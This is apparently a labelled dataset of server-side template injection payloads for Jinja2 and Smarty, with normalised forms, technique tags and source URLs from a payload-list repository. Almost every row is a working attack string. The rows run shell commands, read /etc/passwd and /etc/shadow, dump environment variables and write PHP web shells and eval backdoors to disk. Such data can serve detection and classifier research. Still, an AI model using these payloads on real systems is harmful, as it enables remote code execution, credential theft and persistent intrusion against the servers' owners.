{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{request.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{config.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{config.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.cycler.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.lipsum.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.lipsum.__globals__.os.popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.joiner.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.namespace.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{php}exec('id');{/php},{php}exec('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}passthru('id');{/php},{php}passthru('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}shell_exec('id');{/php},{php}shell_exec('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('whoami');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat /etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('ls -la');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('uname -a');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('pwd');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('env');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat flag.txt');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('ps aux');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('ifconfig');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('netstat -an');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat /etc/shadow');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}phpinfo();{/php},{php}phpinfo();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}eval($_GET['cmd']);{/php},{php}eval($_get['S']);{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}eval($_POST['cmd']);{/php},{php}eval($_post['S']);{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}eval($_REQUEST['cmd']);{/php},{php}eval($_request['S']);{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo `whoami`;{/php},{php}echo`whoami`;{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo `cat /etc/passwd`;{/php},{php}echo`cat/etc/passwd`;{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo file_get_contents('/etc/passwd');{/php},{php}echofile_get_contents('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo file_get_contents('flag.txt');{/php},{php}echofile_get_contents('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo readfile('/etc/passwd');{/php},{php}echoreadfile('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo readfile('flag.txt');{/php},{php}echoreadfile('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r(scandir('/'));{/php},{php}print_r(scandir('S'));{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r(scandir('.'));{/php},{php}print_r(scandir('S'));{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}var_dump(scandir('/'));{/php},{php}var_dump(scandir('S'));{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}highlight_file('/etc/passwd');{/php},{php}highlight_file('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}highlight_file('flag.txt');{/php},{php}highlight_file('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}show_source('/etc/passwd');{/php},{php}show_source('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}show_source('flag.txt');{/php},{php}show_source('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$output=shell_exec('id');echo $output;{/php},{php}$output=shell_exec('S');echo$output;{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$output=shell_exec('whoami');echo $output;{/php},{php}$output=shell_exec('S');echo$output;{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$output=shell_exec('cat /etc/passwd');echo $output;{/php},{php}$output=shell_exec('S');echo$output;{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}file_put_contents('shell.php','<?php system($_GET[cmd]); ?>');{/php}","{php}file_put_contents('S','S');{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}file_put_contents('info.php','<?php phpinfo(); ?>');{/php}","{php}file_put_contents('S','S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}file_put_contents('backdoor.php','<?php eval($_POST[cmd]); ?>');{/php}","{php}file_put_contents('S','S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('whoami')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cat /etc/passwd')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('ls -la')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('uname -a')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('id')},{exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('whoami')},{exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('cat /etc/passwd')},{exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('id')},{passthru('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('whoami')},{passthru('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('cat /etc/passwd')},{passthru('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('id')},{shell_exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('whoami')},{shell_exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('cat /etc/passwd')},{shell_exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{file_get_contents('/etc/passwd')},{file_get_contents('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{file_get_contents('flag.txt')},{file_get_contents('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{readfile('/etc/passwd')},{readfile('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{readfile('flag.txt')},{readfile('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{phpinfo()},{phpinfo()},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{highlight_file('/etc/passwd')},{highlight_file('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{show_source('/etc/passwd')},{show_source('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{scandir('/')},{scandir('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{scandir('.')},{scandir('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{self::getStreamVariable(""file:/etc/passwd"")}","{self::getstreamvariable(""S"")}",php,Smarty,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{self::getStreamVariable(""file:flag.txt"")}","{self::getstreamvariable(""S"")}",php,Smarty,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php phpinfo(); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php system($_GET['x']); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php eval($_POST['x']); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='system'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='exec'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='passthru'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='shell_exec'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x'}{php}system('id');{/php}{/function}{x},{functionname='S'}{php}system('S');{/php}{/function}{x},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x'}{php}phpinfo();{/php}{/function}{x},{functionname='S'}{php}phpinfo();{/php}{/function}{x},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{$smarty.template_object->smarty->display('string:{php}system($_GET[cmd]);{/php}')},{$smarty.template_object->smarty->display('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='system(""id"")'}",{mathequation='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='exec(""id"")'}",{mathequation='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='passthru(""id"")'}",{mathequation='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='shell_exec(""id"")'}",{mathequation='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='system'},{assignvar='S'value='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='exec'},{assignvar='S'value='S'},php,Smarty,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='passthru'},{assignvar='S'value='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='shell_exec'},{assignvar='S'value='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='phpinfo'},{assignvar='S'value='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='system'}{$a('id')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='exec'}{$a('whoami')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='passthru'}{$a('cat /etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='shell_exec'}{$a('ls -la')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='file_get_contents'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='readfile'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='highlight_file'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='show_source'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='scandir'}{$a('/')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='phpinfo'}{$a()},{assignvar='S'value='S'}{$a()},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{capture name='x'}{php}system('id');{/php}{/capture},{capturename='S'}{php}system('S');{/php}{/capture},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{capture name='x'}{php}phpinfo();{/php}{/capture},{capturename='S'}{php}phpinfo();{/php}{/capture},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{capture name='x'}{php}eval($_GET['cmd']);{/php}{/capture},{capturename='S'}{php}eval($_get['S']);{/php}{/capture},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{literal}{php}system('id');{/php}{/literal},{literal}{php}system('S');{/php}{/literal},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{literal}{php}phpinfo();{/php}{/literal},{literal}{php}phpinfo();{/php}{/literal},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if system('id')}{/if},{ifsystem('S')}{/if},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if exec('id')}{/if},{ifexec('S')}{/if},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if passthru('id')}{/if},{ifpassthru('S')}{/if},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if shell_exec('id')}{/if},{ifshell_exec('S')}{/if},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if phpinfo()}{/if},{ifphpinfo()}{/if},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{foreach from=system('id') item=i}{/foreach},{foreachfrom=system('S')item=i}{/foreach},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{foreach from=exec('id') item=i}{/foreach},{foreachfrom=exec('S')item=i}{/foreach},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{section name=x loop=system('id')}{/section},{sectionname=xloop=system('S')}{/section},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{section name=x loop=exec('id')}{/section},{sectionname=xloop=exec('S')}{/section},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat${IFS}/etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat$IFS/etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
